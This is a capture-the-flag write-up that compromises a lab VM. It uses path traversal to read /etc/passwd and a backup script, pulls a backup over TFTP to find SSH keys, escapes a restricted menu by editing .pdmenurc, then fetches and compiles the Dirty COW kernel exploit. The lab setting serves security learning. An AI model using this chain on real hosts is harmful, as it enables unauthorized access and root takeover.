10.0.2.6	08:00:27:45:29:54	CADMUS COMPUTER SYSTEMS


Because the CTF-VM showed me the IP on startup, i know its 10.0.2.6

Gather more information about the specific host

$ sparta

Add host 10.0.2.6 to scope.

Nmap section of sparta shows us port 80 is open - So we got a webserver
Even a MySQL server is running on the machine.
Aswell as port 22 is open, wich tells us we can access machine via SSH!

After nmap is finnished, nikto is doing some testing.

A bunch of intresting errors appear, but one specifically catches my attention.
Appearantly the server is vulnalbe to a LFI-attack.

"+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)"

In the browser i type in 10.0.2.6/index.php?page=../../../etc/passwd

I clean up the output and focus on the bottom 4 lines containing users.

"bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh"

* Here i missed something, apperantly there was a user named "Debian-exim", wich i didn't know is a often-vulnable application *

I try using the LFI to get into the home directorys, it doesnt work. So i move on to the backup script.

10.0.2.6/index.php?page=/../../../usr/local/scripts/backup.sh

#!/bin/bash

########################
# Server Backup script #
########################

#Backup directories in /backups so we can get it via tftp

echo "Backing up data"
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
echo "Backup complete"

I can tell the backup is saved in a .tar archive, and it's accesible via tftp

$ tftp 10.0.2.6
$ tftp> get backup.tar
$ Received 1824718 bytes in 6.0 seconds.

Exit out of tftp

$ tar -xvf backup.tar
$ ls
$ backup.tar  home  var
$ cd home/
$ ls
$ bob  paul  peter
// Looked into all users, but found most intresting stuff in pauls folder.
$ cd paul
$ ls
$ keys
$ cd keys/
$ ls
$ id_key1      id_key2      id_key3      id_key4      id_key5      id_key6
  id_key1.pub  id_key2.pub  id_key3.pub  id_key4.pub  id_key5.pub  id_key6.pub

So i checked all the keys with "cat" from number 1.
First 3 keys was DSA keys, and the fourth one was a RSA key

$ ssh paul@10.0.2.6 -i id_key4

And got acces to the server, but paul is appearantly a inexperienced linux user
So he only got acces to a Pdmenu..

+-----Main Menu-----+
¦ Directory listing ¦
¦ Change directory  ¦
¦ Edit file         ¦
¦ Who's online?     ¦
¦ WWW               ¦
¦ Telnet            ¦
¦ Ping              ¦
¦                   ¦
¦ Exit              ¦
+-------------------+

After a while i thought that there must be some kind of configuration file where
i can change the options available in this menu. And by trying the "Edit file"
option i saw that the text editor was VIM, so if i couldn't change the configuration
file i knew there is some type of Get Shell exploit in VIM

After checking google, i found out there is a file called .pdmenurc where you can
add options to the menu.

Edit file > .pdmenurc
"
#!/usr/bin/pdmenu
#
# Note that the above bang-path isn't required, but it lets you run this
# file directly as a sort of pdmenu script.

# Sample menus for Pdmenu.

# Define the main menu.
menu:main:Main Menu
        exec:_Directory listing:truncate:ls -l
        exec:_Change directory:edit,set:echo PWD=~set to?:~
        exec:_Edit file:edit,pause:vim ~filename?:~
        exec:_Who's online?:truncate:echo "These users are online:";w
        exec:_WWW:edit,pause:lynx ~URL?:~
        exec:_Telnet:edit,pause:telnet "~Telnet to where?:~"
        exec:_Ping:edit,pause:ping "~host?:~"
        nop
        exit:_Exit"

So i edited this file, adding following line.

exec:_GetShell:edit,pause:/bin/bash

Exited out of the SSH-Session and connected again.
Selected "GetShell"

Aaaaand we got shell.

I tried checking some services running as root, but didn't find anything.

Went to G0tm1lk's priv escalation "guide" and did some checks on the Distro

$ cat /etc/*-release
$ DISTRIB_ID=Ubuntu
  DISTRIB_RELEASE=16.10
  DISTRIB_CODENAME=yakkety
  DISTRIB_DESCRIPTION="Ubuntu 16.10"
  NAME="Ubuntu"

Went to googled and searched for exploits on Ubuntu 16.10, got some answers but nothing really "wow"

I forgot to check the Linux version before, so i did it now.
$ uname -a
  Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

And then i remembered the Dirty Cow exploit, could but should not be viable here.

https://www.exploit-db.com/exploits/40616/

$ mkdir cow
$ cd cow
$ wget https://www.exploit-db.com/download/40616
$ mv 40616 cow.c
$ gcc cow.c -o cowroot -pthread
$ ./cowroot
